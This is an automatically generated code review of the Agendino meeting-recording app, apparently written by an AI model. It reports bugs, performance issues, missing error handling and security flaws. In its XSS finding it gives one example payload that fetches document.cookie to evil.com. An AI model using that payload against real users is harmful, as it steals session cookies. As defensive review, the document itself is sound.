# Weekly Code Review — Agendino

**Date:** 2026-09-07  
**Model:** `claude-sonnet-4-6`  
**Files reviewed:** 158

> **Note:** some files were omitted from this review:
>
> - `src/static/style.css (too large: 354 KB)`

---

## 1. Potential Bugs & Issues

### CRITICAL — `summary_id = 75` hard-coded in `ActionItemController.create_manual_action_item`
`src/controllers/ActionItemController.py` lines ~95–100:
```python
# Get a valid summary_id (needed due to foreign key constraints)
# For manual items, just use the most recent summary from any recording
# We know summary IDs 73, 74, 75 exist from our earlier check
summary_id = 75  # Use a known valid summary_id
```
This hard-coded database ID will trigger a foreign-key constraint violation on any installation other than the original developer's machine, and will break even on that machine once summary 75 is deleted. Manual action item creation is effectively broken everywhere except one specific database state.

### HIGH — Notion publishing always raises `TypeError`
`src/controllers/DashboardController.py`, `publish_summary`:
```python
result = svc.publish_summary(
    title=publish_title,
    summary_markdown=summary.summary,
    tags=tags,
    recording_name=summary.recording_name,
    tasks=tasks_list,   # ← passed to every service
)
```
`NotionService.publish_summary` (`src/services/NotionService.py`) does **not** accept a `tasks` parameter. The resulting `TypeError` is caught by the surrounding `except Exception` and silently returned as `{"ok": False, "error": "Publish failed: …"}`. Notion publishing has been silently broken since tasks were added.

### HIGH — `auto_commit.py` stages every file with `git add -A`
`auto_commit.py`, `auto_commit()`:
```python
subprocess.run(['git', 'add', '-A'], cwd=REPO_PATH, check=True, timeout=30)
```
This will stage and commit `.env` (containing API keys), the SQLite database (`settings/agendino.db`, which contains transcripts and user data), and any other untracked file. The initial `.env` commit is prevented only if `.gitignore` is already set up correctly; new secrets or the database could be committed without warning.

### MEDIUM — Hard-coded absolute paths for Team Manager sync
`src/controllers/DashboardController.py`, `_sync_team_manager`:
```python
exporter = "/opt/agendino/export_team_manager.py"
...
with open("/opt/agendino/team_manager_sync.log", "a") as logf:
```
`export_team_manager.py` similarly hard-codes:
```python
DB = "/opt/agendino/settings/agendino.db"
VAULT = "/home/git/obsidian-working"
```
These will silently no-op on any machine other than the original development server.

### MEDIUM — XSS in email HTML body
`src/services/EmailService.py`, `_format_action_item_html`:
```python
return f"""
<div class="action-item {priority_class}">
    <div class="item-title">{item['title']}</div>
    ...
    {description}
```
`item['title']` and `description` are user-controlled strings injected directly into HTML without escaping. A title like `<img src=x onerror=fetch('//evil.com/?c='+document.cookie)>` would execute in an HTML-capable email client.

### MEDIUM — Timezone stripping in iCal sync loses event times
`src/services/ICalSyncService.py`, `_to_datetime_str`:
```python
if isinstance(dt_val, datetime):
    # Strip timezone info for naive storage
    return dt_val.strftime("%Y-%m-%d %H:%M:%S")
```
A UTC event at 14:00 stored in a system running at UTC-5 will appear as 14:00 local time instead of 09:00. Events from global calendars will show incorrect times.

### MEDIUM — `WhisperTranscriptionService._get_model` is not thread-safe
```python
def _get_model(self):
    if self._model is None:
        self._model = WhisperModel(...)
```
Two simultaneous transcription requests under FastAPI's async worker pool can both observe `self._model is None` and both load the model, doubling RAM consumption or causing corrupt state. A `threading.Lock` is needed.

### LOW — `export_team_manager.py` hard-codes personal data and specific record IDs
The `ROLE`, `ALIAS`, and `NONPERSON` dicts encode real people's names and roles, and the preview mode references specific record IDs (`for rid in (235, 227, 230)`) that exist only in one database instance. The file cannot be shared or reused without manual editing.

### LOW — `DBActionItem.from_dict` uses `data["task_id"]` not `data.get("task_id")`
```python
task_id=data["task_id"],
```
While DB rows always include the key, callers that build dicts manually (as in `migrate_action_items.py`) could trigger a `KeyError`. All other optional fields use `.get()`.

---

## 2. Performance Improvements

### N+1 queries in `get_recordings_status`
`src/controllers/DashboardController.py`:
```python
"summary_count": len(self._sqlite_db_repository.get_summaries(bare_name)) if db_rec else 0,
```
One `SELECT` per recording is issued just to count summaries, on top of `get_latest_summaries_map()` which already queries all summaries. A single `GROUP BY` count query would eliminate O(n) round trips.

### `get_recordings` issues one query per recording for hydration
`src/repositories/SqliteDBRepository.py`:
```python
for rec in recordings:
    self._hydrate_latest_summary_fields(conn, rec)
```
A `LEFT JOIN` with `ROW_NUMBER()` or the same subquery pattern already used in `get_latest_summaries_map` would collapse this to one query.

### `_reconcile_orphan_files` runs on every dashboard load
```python
def get_recordings_status(self) -> dict:
    self._reconcile_orphan_files()
```
File-system scanning and potential renames on every page load is expensive. This should be triggered only on sync/upload operations or as an occasional background task.

### `_ensure_calendar_tables` / `_ensure_action_items_table` called on every operation
Both methods execute `CREATE TABLE IF NOT EXISTS` and migration checks on every single DB call. These should run once at startup (or on first connection), not before every query.

### `get_recordings_for_day` loads all recordings then filters in Python
```python
rows = conn.execute("SELECT ... FROM recording").fetchall()
```
All recordings are fetched and then filtered in Python. A `WHERE recorded_at LIKE ? OR ...` clause would reduce the result set dramatically.

### Vector store embeds documents one at a time
`src/repositories/VectorStoreRepository.py`, `_embed` is called with a single-element list per document. The Gemini embedding API supports batch requests; loading 200 summaries currently issues 200 API calls instead of a handful.

### `RAGController.load_transcripts` silently discards most transcript content
```python
chunks = [transcript_text[i:i+4000] for i in range(0, len(transcript_text), 3000)]
transcript_text = chunks[0]
if len(chunks) > 1:
    transcript_text += "..." + chunks[1][:1000]
```
All but the first chunk is thrown away. Proper chunking with overlap and storing each chunk separately (as ChromaDB supports) would give far better retrieval recall.

---

## 3. Missing Error Handling

### Gemini-uploaded files are never deleted
`src/services/TranscriptionService.py`:
```python
uploaded = self._client.files.upload(file=path, ...)
response = self._client.models.generate_content(...)
return response.text
```
The uploaded file object (`uploaded`) is never deleted via `self._client.files.delete(uploaded.name)`. Every transcription leaks a file into the Gemini file store until it expires automatically.

### `ObsidianService` subprocess has no timeout
```python
result = subprocess.run(
    ['/bin/bash', self.auto_commit_script],
    capture_output=True, text=True, check=False
)
```
If the auto-commit script hangs (e.g., waiting for a git push to a slow remote), the HTTP request will block indefinitely. A `timeout=` argument is missing.

### `_extract_action_items_from_summary` uses bare `except:`
`src/controllers/DashboardController.py`:
```python
for fmt in ['%Y-%m-%d', '%m/%d/%Y', '%m-%d-%Y', '%d/%m/%Y']:
    try:
        due_date = datetime.strptime(due_date_str, fmt)
        break
    except ValueError:
        continue
except:      # ← bare except at the outer level
    pass
```
The outer `except:` swallows `KeyboardInterrupt`, `SystemExit`, and all other base exceptions. All exceptions in this path should be caught narrowly and logged.

### `ClaudeTaskGenerationService` does not attempt JSON repair
`src/services/ClaudeTaskGenerationService.py`:
```python
except json.JSONDecodeError as e:
    logger.error(...)
    return []
```
`ClaudeSummarizationService` and `SummarizationService` both use `json_repair` as a fallback. Task generation silently returns an empty list on any malformed response.

### `NotionService._append_blocks` silently discards errors
```python
try:
    httpx.patch(...)
except httpx.HTTPError:
    pass
```
When a summary exceeds 100 Notion blocks, additional blocks are silently dropped if the append call fails. The user sees a "Published successfully" message but receives a truncated page.

### `db_init.sql` is not applied to action_items table
The `action_items` table is absent from `settings/db_init.sql` and is created only by `_ensure_action_items_table()` on first use. A fresh database created from the SQL schema alone will be missing the table. Automated restore or schema-based migrations will be incomplete.

### Resource leak: `migrate_action_items.py` opens a raw connection inside a loop
```python
conn = sqlite3.connect(os.path.join(..., "settings/agendino.db"))
...
conn.close()
```
The connection is closed only on the success path; an exception between `connect` and `close` leaks the connection. A `with` statement or `try/finally` is needed.

---

## 4. New Feature Ideas

**1. Configurable audio chunking for Whisper long recordings**
Whisper works segment-by-segment already, but the dashboard treats transcription as atomic. Exposing a progress stream (e.g., via Server-Sent Events) and persisting partial transcripts would allow monitoring and resuming multi-hour recordings.

**2. Scheduled iCal auto-sync**
Shared calendars have a `sync_interval_minutes` field, but there is no background task that honours it. A lightweight APScheduler or asyncio periodic task started in `main.py` would make this field functional and keep calendars fresh without manual sync clicks.

**3. Bulk re-summarize with a new prompt**
Users often want to apply a newly discovered prompt across all existing recordings. A batch endpoint (`POST /api/dashboard/bulk-summarize`) that accepts a prompt ID and a list of recording names (or "all") would enable this without clicking through each recording individually.

**4. Per-recording access control / sharing links**
The app currently has no authentication. Adding a lightweight token-based sharing mechanism would let users share a specific summary (read-only, time-limited token in URL) with colleagues who don't have server access, without exposing the full dashboard.

**5. Automated `.env` / secret scanning before commit**
Given the `auto_commit.py` feature that runs `git add -A`, a pre-commit hook or a file-exclusion list checked before staging would prevent accidentally committing `.env`, `*.db`, or log files containing personal data. Alternatively, a warning mode in `auto_commit.py` that lists sensitive files before committing would reduce risk.

---

## 5. Code Quality Improvements

### `SystemPromptsRepository.get_all` silently ignores all non-English prompts
`src/repositories/SystemPromptsRepository.py`:
```python
if lang_dir.name != "en":
    continue
```
The repository contains a full Italian prompt library under `system_prompts/it/`, referenced in the README, but the API returns only English prompts. This filter appears to be a temporary workaround that was never removed.

### `get_config()` is called but its return value is always discarded
`src/app/depends.py`:
```python
def get_dashboard_controller() -> DashboardController:
    _config = get_config()   # result never used
```
`get_config()` also mutates a module-level `config` dict on every request, which is not thread-safe and unnecessary since `os.getenv` is used directly everywhere.

### `sync_meeting_titles` endpoint accepts state-changing data via query param
`src/app/api/endpoints/action_items.py`:
```python
@router.post("/recordings/{recording_id}/sync-meeting-title")
async def sync_meeting_titles(
    recording_id: int,
    meeting_title: str = None,    # query parameter on a POST
```
`meeting_title` is sent as a query string on a state-modifying POST. The JavaScript client uses `encodeURIComponent` to build this URL manually. It should be a request body field (Pydantic model).

### Inconsistent response contracts across the API
Controller methods return `{"ok": bool, "error": str}` dicts; some endpoints convert these to `HTTPException` (404/500) while others forward the dict verbatim. Clients must handle both patterns. A consistent approach — either always raise HTTP errors or always return structured dicts — would simplify client code.

### Magic strings are scattered throughout business logic
`"en/General/DefaultSummary"` appears hard-coded in `DashboardController.summarize_recording`; model names (`"gemini-2.5-flash"`, `"claude-sonnet-4-6"`) appear as literals in multiple service files; status values (`"pending"`, `"in_progress"`, `"completed"`) appear unconstrained. These should be `Enum` or module-level constants.

### `DashboardController` violates single-responsibility principle
The controller directly handles: filename parsing, datetime parsing, action item extraction from summary text, Obsidian Team Manager sync, audio duration extraction, and file rename reconciliation. Business logic should move to dedicated services; the controller should only coordinate.

### Test coverage gaps for critical paths
There are no tests for:
- `ActionItemController` (entire module)
- `RAGController` and `VectorStoreRepository`
- `EmailService` HTML/text generation
- `ObsidianService` publishing logic
- All API endpoint integration tests (only unit tests exist)

The existing `test_DashboardController.py` is thorough but the `publish_summary` tests use a mock `NotionService` that accepts any kwargs, masking the `tasks` parameter bug identified in §1.

### `_ensure_recording_columns` uses exception-driven schema detection
```python
try:
    conn.execute("SELECT file_extension FROM recording LIMIT 1")
except Exception:
    conn.execute("ALTER TABLE recording ADD COLUMN ...")
```
Using `PRAGMA table_info(recording)` to check column presence is cleaner, more explicit, and avoids catching unrelated exceptions that happen to come from the same `try` block.

---

<details><summary>Files reviewed</summary>

- `.env.example`
- `README.md`
- `auto_commit.py`
- `export_team_manager.py`
- `migrate_action_items.py`
- `pyproject.toml`
- `pytest.ini`
- `requirements-dev.txt`
- `requirements.txt`
- `settings/db_init.sql`
- `src/__init__.py`
- `src/app/__init__.py`
- `src/app/api/__init__.py`
- `src/app/api/api.py`
- `src/app/api/endpoints/__init__.py`
- `src/app/api/endpoints/action_items.py`
- `src/app/api/endpoints/calendar.py`
- `src/app/api/endpoints/dashboard.py`
- `src/app/api/endpoints/knowledge.py`
- `src/app/api/endpoints/notifications.py`
- `src/app/api/endpoints/proactor.py`
- `src/app/depends.py`
- `src/app/router.py`
- `src/app/web/__init__.py`
- `src/app/web/dashboard.py`
- `src/app/web/knowledge.py`
- `src/controllers/ActionItemController.py`
- `src/controllers/CalendarController.py`
- `src/controllers/DashboardController.py`
- `src/controllers/ProactorController.py`
- `src/controllers/RAGController.py`
- `src/controllers/__init__.py`
- `src/main.py`
- `src/models/DBActionItem.py`
- `src/models/DBCalendarEvent.py`
- `src/models/DBDailyRecap.py`
- `src/models/DBRecording.py`
- `src/models/DBSharedCalendar.py`
- `src/models/DBSummary.py`
- `src/models/DBTask.py`
- `src/models/__init__.py`
- `src/models/dto/CreateActionItemDTO.py`
- `src/models/dto/CreateCalendarEventDTO.py`
- `src/models/dto/CreateManualActionItemDTO.py`
- `src/models/dto/DeleteRecordingRequestDTO.py`
- `src/models/dto/GenerateTasksRequestDTO.py`
- `src/models/dto/LinkRecordingEventDTO.py`
- `src/models/dto/MindMapRequestDTO.py`
- `src/models/dto/ProactorAnalyzeRequestDTO.py`
- `src/models/dto/PublishRequestDTO.py`
- `src/models/dto/RAGQueryRequestDTO.py`
- `src/models/dto/SharedCalendarDTO.py`
- `src/models/dto/SummarizeRequestDTO.py`
- `src/models/dto/TranscribeRequestDTO.py`
- `src/models/dto/UpdateActionItemDTO.py`
- `src/models/dto/UpdateCalendarEventDTO.py`
- `src/models/dto/UpdateRecordingRequestDTO.py`
- `src/models/dto/UpdateSummaryRequestDTO.py`
- `src/models/dto/UpdateTaskRequestDTO.py`
- `src/models/dto/UpdateTranscriptRequestDTO.py`
- `src/models/dto/__init__.py`
- `src/repositories/LocalRecordingsRepository.py`
- `src/repositories/SqliteDBRepository.py`
- `src/repositories/SystemPromptsRepository.py`
- `src/repositories/VectorStoreRepository.py`
- `src/repositories/__init__.py`
- `src/services/ClaudeSummarizationService.py`
- `src/services/ClaudeTaskGenerationService.py`
- `src/services/DailyNotificationService.py`
- `src/services/DailyRecapService.py`
- `src/services/EmailService.py`
- `src/services/ICalSyncService.py`
- `src/services/NotionService.py`
- `src/services/ObsidianService.py`
- `src/services/ProactorService.py`
- `src/services/RAGService.py`
- `src/services/SummarizationService.py`
- `src/services/TaskGenerationService.py`
- `src/services/TranscriptionService.py`
- `src/services/WhisperTranscriptionService.py`
- `src/services/__init__.py`
- `src/static/action_items.js`
- `src/static/app.js`
- `src/static/calendar.css`
- `src/static/calendar.js`
- `src/static/dashboard.css`
- `src/static/dashboard.js`
- `src/static/hidock-device.js`
- `src/static/knowledge.css`
- `src/static/knowledge.js`
- `src/static/proactor.css`
- `src/static/proactor.js`
- `src/templates/dashboard/action_items.html`
- `src/templates/dashboard/calendar.html`
- `src/templates/dashboard/home.html`
- `src/templates/dashboard/main_template.html`
- `src/templates/dashboard/proactor.html`
- `src/templates/knowledge/home.html`
- `start_autocommit.sh`
- `start_daily_notifications.sh`
- `status_autocommit.sh`
- `status_daily_notifications.sh`
- `stop_autocommit.sh`
- `stop_daily_notifications.sh`
- `system_prompts/en/General/AdaptiveSummary.txt`
- `system_prompts/en/General/CleanTranscript.txt`
- `system_prompts/en/General/ClearSummary.txt`
- `system_prompts/en/General/CompleteTranscript.txt`
- `system_prompts/en/General/DecisionsAndRisks.txt`
- `system_prompts/en/General/DefaultSummary.txt`
- `system_prompts/en/General/ExecutiveQuality.txt`
- `system_prompts/en/General/ExecutiveSummary.txt`
- `system_prompts/en/General/ExecutiveTLDR.txt`
- `system_prompts/en/General/JobInterview.txt`
- `system_prompts/en/General/QAMinutes.txt`
- `system_prompts/en/General/ReasoningSummary.txt`
- `system_prompts/en/Meeting/ActionTracker.txt`
- `system_prompts/en/Meeting/AdvancedStrategicMinutes.txt`
- `system_prompts/en/Meeting/ClientRecap.txt`
- `system_prompts/en/Meeting/DetailedSummary.txt`
- `system_prompts/en/Meeting/ITMinutes.txt`
- `system_prompts/en/Meeting/LightPostMortem.txt`
- `system_prompts/en/Meeting/MeetingNote.txt`
- `system_prompts/en/Meeting/MeetingNotes.txt`
- `system_prompts/en/Meeting/OperationalSummary.txt`
- `system_prompts/en/Meeting/RequirementsMinutes.txt`
- `system_prompts/en/Meeting/Secretary.txt`
- `system_prompts/en/Meeting/TeamMinutes.txt`
- `system_prompts/it/Generale/ColloquioLavoro.txt`
- `system_prompts/it/Generale/DecisioniERischi.txt`
- `system_prompts/it/Generale/RiepilogoRagionamento.txt`
- `system_prompts/it/Generale/Riunione.txt`
- `system_prompts/it/Generale/SintesiAdattiva.txt`
- `system_prompts/it/Generale/SintesiChiara.txt`
- `system_prompts/it/Generale/TLDRDirigenziale.txt`
- `system_prompts/it/Generale/TrascrizioneCompleta.txt`
- `system_prompts/it/Generale/VerbaleQ&A.txt`
- `system_prompts/it/IT&Engineering/PostMortemLeggero.txt`
- `system_prompts/it/IT&Engineering/VerbaleIT.txt`
- `system_prompts/it/IT&Engineering/VerbaleRequisiti.txt`
- `system_prompts/it/IT&Engineering/VerbaleTeam.txt`
- `system_prompts/it/Riunione/ActionTracker.txt`
- `system_prompts/it/Riunione/Nota.txt`
- `system_prompts/it/Riunione/RecapCliente.txt`
- `system_prompts/it/Riunione/RiepilogoDettagliato.txt`
- `system_prompts/it/Riunione/Segretario.txt`
- `system_prompts/it/Riunione/SintesiOperativa.txt`
- `system_prompts/it/Riunione/VerbaleStrategicoAvanzato.txt`
- `tests/integration/repositories/test_integration_LocalRecordingsRepository.py`
- `tests/integration/repositories/test_integration_SqliteDBRepository.py`
- `tests/unit/controllers/test_DashboardController.py`
- `tests/unit/models/test_DBRecording.py`
- `tests/unit/repositories/test_LocalRecordingsRepository.py`
- `tests/unit/repositories/test_SqliteDBRepository.py`
- `tests/unit/repositories/test_SystemPromptsRepository.py`
- `tests/unit/services/test_NotionService.py`
- `tests/unit/services/test_ProactorService.py`
- `tests/unit/services/test_SummarizationService.py`

</details>

*Generated automatically by weekly_code_review.py*
